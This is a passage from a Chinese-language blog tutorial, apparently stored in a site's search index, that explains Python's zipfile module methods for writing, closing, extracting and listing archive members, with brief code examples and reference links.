是用于解密文件的密码。</code></pre><p> ZipFile.write(filename, arcname&#x3D;None, compress_type&#x3D;None, compresslevel&#x3D;None)</p><pre><code class="hljs">将名为 filename 的文件写入归档，给予的归档名为 arcname (默认情况下将与 filename 一致，但是不带驱动器盘符并会移除开头的路径分隔符)。 compress_type 如果给出，它将覆盖作为构造器 compression 形参对于新条目所给出的值。类似地，compresslevel 如果给出也将覆盖构造器。 归档必须使用 &#39;w&#39;, &#39;x&#39; 或 &#39;a&#39; 模式打开。</code></pre><p>第二个参数是“压缩类型”参数，它告诉计算机使用怎样的算法来压缩文件。可以总是将这个值设置为zipfile.ZIP_DEFLATED（这指定了 deflate 压缩算法，它对各种类型的数据都很有效）。</p><p>ZipFile.close()</p><pre><code class="hljs">关闭归档文件。 你必须在退出程序之前调用 close() 否则将不会写入关键记录数据。</code></pre><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>写入压缩文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile.write(<span class="hljs-string">r&quot;../test.py&quot;</span>)<br>zfile.close()//关闭对象<br></code></pre></td></tr></table></figure><p>解压文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile.extractall()//解压所有文件<br>zfile.extract(<span class="hljs-string">r&quot;test.py&quot;</span>)//解压指定文件<br>zfile.close()//关闭对象<br></code></pre></td></tr></table></figure><h2 id="3-其他常见方法"><a href="#3-其他常见方法" class="headerlink" title="3.其他常见方法"></a>3.其他常见方法</h2><p>ZipFile.getinfo(name)</p><pre><code class="hljs">返回一个 ZipInfo 对象，其中包含有关归档成员 name 的信息。 针对一个目前并不包含于归档中的名称调用 getinfo() 将会引发 KeyError。</code></pre><p>ZipFile.infolist()</p><pre><code class="hljs">返回一个列表，其中包含每个归档成员的 ZipInfo 对象。 如果是打开一个现有归档则这些对象的排列顺序与它们对应条目在磁盘上的实际 ZIP 文件中的顺序一致。</code></pre><p>ZipFile.namelist()</p><pre><code class="hljs">返回按名称排序的归档成员列表（也就是压缩包里的文件名）。</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://docs.python.org/zh-cn/3/library/zipfile.html#zipfile.ZIP_BZIP2">https://docs.python.org/zh-cn/3/library/zipfile.html#zipfile.ZIP_BZIP2</a></p><p><a href="https://www.cnblogs.com/wangylblog/p/13925894.html">https://www.cnblogs.com/wangylblog/p/13925894.html</a></p><p><a href="https://blog.csdn.net/sinat_38682860/article/details/114176182">https://blog.csdn.net/sinat_38682860/article/details/114176182</a></p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>脚本</tag>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
